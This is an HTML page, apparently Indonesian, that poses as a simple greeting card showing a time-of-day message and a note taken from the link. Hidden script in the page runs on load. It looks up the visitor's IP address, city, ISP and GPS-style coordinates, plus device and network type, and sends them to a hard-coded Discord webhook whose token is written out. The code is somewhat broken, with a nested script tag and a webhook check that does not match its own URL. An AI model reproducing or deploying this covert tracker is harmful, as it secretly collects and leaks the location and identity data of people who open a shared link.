<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;600;800&display=swap');

        :root { --bg: #121212; --primary: #00ff88; --txt: #f0f0f0; }

        body {
            background: var(--bg); color: var(--txt); font-family: 'Poppins', sans-serif;
            margin: 0; height: 100vh; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center;
            overflow: hidden;
        }

        /* Desain estetik: Besar-Kecil vary */
        .greeting-box { padding: 20px; }
        
        .hi { font-size: 1.2rem; color: #666; font-weight: 300; letter-spacing: 2px; text-transform: uppercase; }
        .main { font-size: 3.5rem; font-weight: 800; line-height: 1.2; margin: 10px 0; }
        .note { 
            margin-top: 30px; font-size: 1rem; color: #888; 
            background: #1e1e1e; padding: 10px 20px; border-radius: 50px;
            border: 1px solid #333;
        }

        /* Loading ringan */
        .loader {
            position: fixed; bottom: 20px; right: 20px;
            width: 10px; height: 10px; background: var(--primary);
            border-radius: 50%; box-shadow: 0 0 10px var(--primary);
            opacity: 0; transition: opacity 0.5s;
        }
        .loader.active { opacity: 1; }
    </style>
</head>
<body>

    <div class="greeting-box">
        <div class="hi">Hi, Welcome</div>
        <div class="main" id="greetText"></div>
        <div class="note" id="noteText"></div>
    </div>

    <div class="loader" id="loader"></div>

    <script>
        <script>
            
    // === PASTE DISCORD WEBHOOK URL ===
    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1513396133249024242/EZ8GI-vnWbW86C-aG8FLFa54nAj5ur-aTvZ5oLdqmQnj4lNlVbjgXXamrCLwLFZQcPst";

    const params = new URLSearchParams(window.location.search);
    const catetan = params.get('note');

    const jam = new Date().getHours();
    const sapa = jam < 12 ? "Good Morning" : jam < 18 ? "Good Afternoon" : "Good Evening";
    
    document.getElementById('greetText').innerText = sapa + " :)";
    document.getElementById('greetText').setAttribute('data-text', sapa + " :)");
    document.getElementById('noteText').innerText = catetan ? decodeURIComponent(catetan) : "";

    async function collectAndSend() {
        document.getElementById('loader').classList.add('active');

        const waktu = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});

        let ip = "-", loc = "-", isp = "-", latitude = "-", longitude = "-";

        try {
            // AMBIL DATA IP + LOKASI + KOORDINAT Sekaligus
            const d = await fetch('https://ipapi.co/json/').then(r => r.json());
            
            ip = d.ip;
            loc = `${d.city||''}, ${d.region||''}, ${d.country||''}`;
            isp = d.org;
            latitude = d.latitude;
            longitude = d.longitude;
            
        } catch(e) {
            console.log("Error:", e);
        }

        const koordinat = (latitude && longitude) ? `${latitude}, ${longitude}` : "-";

        const ua = navigator.userAgent;
        const device = ua.includes("Windows") ? "Windows" : ua.includes("Mac") ? "Mac" : ua.includes("Android") ? "Android" : "Mobile";
            
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const network = conn ? conn.effectiveType : "Wifi";

        // KIRIM KE DISCORD
        if (WEBHOOK_URL.includes("discord.com/api/webhooks/") && !WEBHOOK_URL.includes("ISI_URL")) {
            const pesan = {
                content: `🎯 **NEW VISITOR**\n` +
                         `⏰ Waktu: ${waktu}\n` +
                         `🌍 IP: ${ip}\n` +
                         `📍 Lokasi: ${loc}\n` +
                         `🏢 ISP: ${isp}\n` +
                         `💻 Device: ${device}\n` +
                         `📡 Network: ${network}\n` +
                         `📍 Koordinat: ${koordinat}\n` +
                         (catetan ? `📝 Catatan: ${decodeURIComponent(catetan)}` : '')
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(pesan)
                });
            } catch(e) {}
        }

        setTimeout(() => document.getElementById('loader').classList.remove('active'), 1500);
    }

    window.onload = collectAndSend;
</script>
</body>
</html>
